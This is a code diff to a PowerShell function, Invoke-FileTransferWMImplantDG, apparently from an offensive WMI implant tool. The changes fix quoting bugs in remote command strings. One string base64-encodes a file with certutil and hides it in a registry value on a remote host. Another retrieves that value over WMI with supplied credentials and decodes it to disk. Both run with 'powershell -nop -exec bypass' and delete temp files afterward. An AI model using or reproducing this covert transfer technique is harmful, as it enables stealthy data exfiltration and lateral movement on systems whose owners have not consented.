@@ -4373,7 +4373,7 @@ function Invoke-FileTransferWMImplantDG
 
             # On remote system, save file to registry
             Write-Verbose "Reading remote file and writing on remote registry"
-            $remote_command = 'certutil -encode ''' + "$Download_file" + ''' ''' + $temp_path + '''; $fct = Get-Content -Path ''' + "$temp_path" + '''; New-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registrydownname'" + ' -Value $fctenc -PropertyType String -Force; del ''' + "$temp_path"
+            $remote_command = 'certutil -encode ''' + "$Download_file" + ''' ''' + $temp_path + '''; $fct = Get-Content -Path ''' + "$temp_path" + '''; New-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registrydownname'" + ' -Value $fct -PropertyType String -Force; del ''' + "$temp_path + '''"
             $remote_command = 'powershell -nop -exec bypass -c "' + $remote_command + '"'
 
             if($Creds)
@@ -4470,7 +4470,7 @@ function Invoke-FileTransferWMImplantDG
             
             # grabs registry value and saves to disk
             Write-Verbose "Connecting to $Target"
-            $remote_posh = '$Hive = 2147483650; $key = ''' + "$regpath'" + '; $value = ''' + "$registryupname" + '''; $pas = ConvertTo-SecureString ''' + "$LocalPass'" + ' -asplaintext -force; $crd = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist ''' + "$LocalUser'" +',$pas; $out = Invoke-WmiMethod -Namespace ''root\default'' -Class ''StdRegProv'' -Name ''GetStringValue'' -ArgumentList $Hive, $key, $value -ComputerName ' + "$SystemHostname" + ' -Credential $crd; Set-Content -Path ' + "$upload_temp" + ' ' +  "$out.sValue" + '; certutil -decode ' + "$upload_temp" + ' ' + "$Upload_Dir" + '; del ' + "$upload_temp"
+            $remote_posh = '$Hive = 2147483650; $key = ''' + "$regpath'" + '; $value = ''' + "$registryupname" + '''; $pas = ConvertTo-SecureString ''' + "$LocalPass'" + ' -asplaintext -force; $crd = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist ''' + "$LocalUser'" +',$pas; $out = Invoke-WmiMethod -Namespace ''root\default'' -Class ''StdRegProv'' -Name ''GetStringValue'' -ArgumentList $Hive, $key, $value -ComputerName ' + "$SystemHostname" + ' -Credential $crd; Set-Content -Path ' + "$upload_temp" + ' $out.sValue; certutil -decode ' + "$upload_temp" + ' ' + "$Upload_Dir" + '; del ' + "$upload_temp"
             $remote_posh = 'powershell -nop -exec bypass -c "' + $remote_posh + '"'
 
             if($Creds)
